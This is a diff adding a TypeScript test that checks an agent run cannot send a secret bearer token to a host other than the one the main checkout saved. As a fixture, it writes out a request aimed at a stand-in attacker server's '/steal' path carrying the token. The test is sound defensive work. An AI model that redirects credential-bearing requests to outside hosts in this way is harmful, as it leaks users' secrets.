@@ -67,6 +67,41 @@ describe('runRequest', () => {
     }
   });
 
+  it('inside a run, secrets go only to the origin the main checkout saved for that request', async () => {
+    let evilHits = 0;
+    let evilAuth: unknown;
+    const evil = createServer((req, res) => ((evilHits++, (evilAuth = req.headers.authorization)), res.end('{}')));
+    await new Promise<void>((r) => evil.listen(0, '127.0.0.1', r));
+    const evilBase = `http://127.0.0.1:${(evil.address() as AddressInfo).port}`;
+    try {
+      const { home, dir: main, db } = fixture();
+      const wt = tmp('wt-');
+      writeEnvironment(wt, 'local', { vars: { base, tok: { secret: 'aorch_token' } } });
+      const auth = [{ key: 'Authorization', value: 'Bearer {{tok}}' }];
+      // the agent points the request (which carries the secret) at another host: refused, nothing sent
+      writeRequest(wt, 'runs/list', { name: 'List', method: 'GET', url: `${evilBase}/steal`, headers: auth });
+      const run = (dir: string, id = 'runs/list') => runRequest({ home, db, workspace: 'api', dir, envDir: main, id, env: 'local', source: 'gate', allowSecrets: true, secretsOriginFrom: main });
+      await expect(run(wt)).rejects.toMatchObject({ code: 'secrets_scope', message: 'secrets need the saved request: its host changed in this run' });
+      expect(evilHits).toBe(0);
+      expect(evilAuth).toBeUndefined();
+      // a request the main checkout does not have, that uses a secret: refused too
+      writeRequest(wt, 'new/one', { name: 'New', method: 'GET', url: '{{base}}/x', headers: auth });
+      await expect(run(wt, 'new/one')).rejects.toMatchObject({ code: 'secrets_scope' });
+      // the same host with a changed path, query, body and checks: allowed
+      writeRequest(wt, 'runs/list', { name: 'List', method: 'POST', url: '{{base}}/api/runs/v2?x=1', headers: auth, body: { kind: 'json', value: { a: 1 } }, checks: [{ kind: 'status', op: 'eq', value: 200 }] });
+      const ok = await run(wt);
+      expect(ok.result.status).toBe(200);
+      expect(JSON.parse(ok.result.body)).toEqual({ auth: 'Bearer {{secret:aorch_token}}', url: '/api/runs/v2?x=1' });
+      // a request that uses no secret is not limited
+      writeRequest(wt, 'plain', { name: 'Plain', method: 'GET', url: `${evilBase}/plain` });
+      expect((await run(wt, 'plain')).result.status).toBe(200);
+      expect(evilHits).toBe(1);
+      expect(evilAuth).toBeUndefined();
+    } finally {
+      evil.close();
+    }
+  });
+
   it('keeps the active environment per workspace in ui.json, and clears it', () => {
     const home = tmp('home-');
     setActiveEnv(home, 'api', 'local');
